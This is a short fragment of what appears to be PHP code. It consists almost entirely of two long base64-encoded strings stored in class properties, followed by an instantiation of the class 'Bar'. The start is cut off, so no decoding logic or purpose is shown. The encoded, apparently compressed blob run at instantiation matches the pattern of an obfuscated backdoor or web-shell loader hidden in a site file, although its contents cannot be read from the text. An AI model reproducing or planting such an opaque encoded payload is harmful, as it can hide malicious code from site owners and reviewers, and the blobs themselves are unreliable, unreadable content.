	JwSjH9eDvXtLpLTkKnbsNKPz9tyTwg730FkDvHbjkJGBISJK1VwsMjxB6rzGce4yxQsmSI9ON4uk21W+
	ukq5/Jze+NmU1wTyyx42EOgzpwmUdncut175uoaYOGmWsas2VraTFnxYk2ClYKBPTyQ7dlAP7MwxtxN9
	HMW+LYMX18P9IoojCKk+liG7haZD42vWqnqtPuGATXOczkx4ToCzHLnNdFl7pfo/d0tcPM8D5uFJC4IE
	9WPkssKorqXxf5XXdh8rN6+QbPBTwoI3mf4N48xtGZmmdYqYkmpcJAlCTAosugYBsqGCjJD8bsn7JszT
	lFMj03Wyj/7eipbfS/vTM2PyKW9uyhp4hQ5XCql7hbG1s6swdg2yj2sIShVX1yS86qWW/bLvVwVESNnl
	o9OmXBa+ufynvyush5fzggris+7vwTdTDprdfD2P+3BPYNXwkO2dTb4zkvcx7q/65mnhjgrf4tvQc4zE
	uoRchBDWqX1NmNz5rJbOlHCf1g8tGhk7P0hsiEsL2wnBcX1tGrcVVe0Tvsi+BN5sdcsirw3BpbNu4Tvg
	r3KskaM65Kq3EpTRny7BPVnUhEAp5IQMKh3ipapjp9V9OcJ42M+Qp7XJfOEQ2op3Z8Kn1Ag5y5rkmeb7
	lFdfKRCG+lXQEPQKb2a/PGF2jlMxrAYtlKWKIBxlaxJJHm3KIqgKPmvT1apUuXWTleBl87Xfi6VJMsXV
	0Wm9j/tcewycsu1fl3oafwKGsDjjwfcg5HIIQLhETuWA658jMabfE3uE0JB0Mzkk0QeyY8KndbhCbxNr
	/XiJrU5jlN6AatKZUGRB7VY5tFiyOGuVbZomIddbbK6FSue3R3nlZ51JtQN8pkTkwiwlPGDJBEJ9Ty/a
	W1TFfD7WvTZ/eaeB3Q/fy4/gEqRrIO8Fm6n4/tBUv0JuO2IGuIaO+573i1NKRKRjBLaYIw==';
	 
	var $stable = 'bVLvT9swEP1cJP6Hw4pwIkUtAVaQ8uMLygRCWkfb7UuZqpA4qmliR45NiUb/950DY2vh2929u+d37+zI
	BmKgNATncbXGsMyqloWHB85j9oQpWRIYQmseWq3cdpUFrrOcpdOf6XRBr+fz78vryWxOf3k+nPhw5uEg
	L13etkxj4zS9+5HO5gu6fC6xx4PfhweDgdM/uUu519mzBWNLN9gCQ0X/sV5NJrc36cIK3OPcxcIeeN1K
	K8N6sl7fEasb3bk4hPOKaaMEZEplfckHyoLL09OC+mB5/N4ZK4XlKwk0epBFB1LkUmj2rGsmTEzeSHrz
	SBK1ueKNTgqZG8T1cKO4ZpVwyfnJOXyTGr5KIwrihe8dUqxZV8iNsCcwItdcCpfhdrwElw1zrapb1sHx
	sc2w9UoWDOI4hvEFvLzAbu1y/Enty8daEFz8M+D18NtwwwXqQEF5xfP1Z3KO3vX8HQ7hw6r3NCqlqiHr
	Z2NCoGZ6JYuYNLLV6BEXjdGgu4bFxBpJQGQ1xvgD9lD8KjVH/CmrDKZJgvjIkif31Au30ejN7mhkT5PQ
	8A8=';
}

new Bar();